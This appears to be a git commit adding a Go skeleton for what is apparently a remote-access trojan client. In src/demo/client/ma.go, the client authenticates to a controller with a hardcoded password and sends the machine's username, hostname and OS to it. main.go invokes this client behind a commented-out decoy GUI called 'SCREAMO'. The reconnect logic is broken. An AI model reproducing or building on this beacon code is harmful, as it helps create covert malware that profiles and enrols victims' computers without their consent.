befee995563ba7eb52471210dce6ea7039b3463b
ylc <80378994@qq.com>
2023-02-07 17:58:31 +0800

    testssssssssssssssssssssssss

---
+++ main.go
@@ -0,0 +1,36 @@
+package main
+
+import (
+	"demo/client"
+	//. "github.com/lxn/walk/declarative"
+)
+
+const (
+	IP   = "192.168.1.209:53"
+	PORT = 1010
+)
+
+func main() {
+	client.Ma()
+	//var inTE, outTE *walk.TextEdit
+	//
+	//MainWindow{
+	//	Title:   "SCREAMO",
+	//	MinSize: Size{600, 400},
+	//	Layout:  VBox{},
+	//	Children: []Widget{
+	//		HSplitter{
+	//			Children: []Widget{
+	//				TextEdit{AssignTo: &inTE},
+	//				TextEdit{AssignTo: &outTE, ReadOnly: true},
+	//			},
+	//		},
+	//		PushButton{
+	//			Text: "SCREAM",
+	//			OnClicked: func() {
+	//				outTE.SetText(strings.ToUpper(inTE.Text()))
+	//			},
+	//		},
+	//	},
+	//}.Run()
+}
---
+++ src/demo/client/ma.go
@@ -0,0 +1,69 @@
+package client
+
+import (
+	"bufio"
+	"encoding/base64"
+	"encoding/binary"
+	"fmt"
+	"net"
+	"os"
+	"strconv"
+)
+
+const (
+	IP      = "127.0.0.1:1010"
+	PORT    = 1010
+	CONNPWD = "18Sd9fkdkf9"
+)
+
+const (
+	HEAD    = "HEAD"
+	VERSION = "1.0.0"
+)
+
+func Ma() {
+	connect()
+}
+
+// 连接远程服务器
+func connect() {
+	//建立tcp连接
+	conn, err := net.Dial("tcp", IP)
+	//连接失败进行重连
+	if err != nil {
+		fmt.Println("Connection...")
+		for {
+			connect()
+
+		}
+	}
+	errMsg := base64.URLEncoding.EncodeToString([]byte(CONNPWD))
+	conn.Write([]byte(string(errMsg) + "\n"))
+	//连接成功
+	fmt.Println("Connection success...")
+	maConnet()
+
+}
+
+func maConnet() {
+	socket, err := net.Dial("tcp", "127.0.0.1:1010")
+	if err != nil {
+		panic(err)
+	}
+	defer socket.Close()
+	IP := "127.0.0.1"
+	writer := bufio.NewWriter(socket)
+
+	binary.Write(writer, binary.LittleEndian, []byte(HEAD))
+	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("USERNAME")))
+	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("HOSTNAME")))
+	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("OS")))
+	binary.Write(writer, binary.LittleEndian, []byte(IP))
+	binary.Write(writer, binary.LittleEndian, []byte("测试地址"))
+	binary.Write(writer, binary.LittleEndian, []byte("测试名字"))
+	binary.Write(writer, binary.LittleEndian, []byte(strconv.Itoa(1111)))
+	binary.Write(writer, binary.LittleEndian, []byte("测试"))
+	binary.Write(writer, binary.LittleEndian, []byte(VERSION))
+	writer.Flush()
+
+}
